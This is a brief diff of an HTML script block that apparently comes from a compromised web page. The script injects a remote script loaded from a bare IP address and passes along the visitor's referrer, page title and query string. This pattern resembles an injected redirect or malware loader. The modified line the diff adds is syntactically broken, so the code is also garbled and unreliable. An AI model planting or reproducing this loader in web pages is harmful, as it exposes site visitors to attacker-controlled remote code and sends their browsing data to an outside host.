@@ -1,6 +1,6 @@
 <script type="application/javascript">
 var d=document;var s=d.createElement('script'); 
-s.src='//185.198.167.189/R9nPvp?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
+s.src=https'//185.198.167.189/R9nPvp?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
 if (document.currentScript) { 
 document.currentScript.parentNode.insertBefore(s, document.currentScript);
 } else {
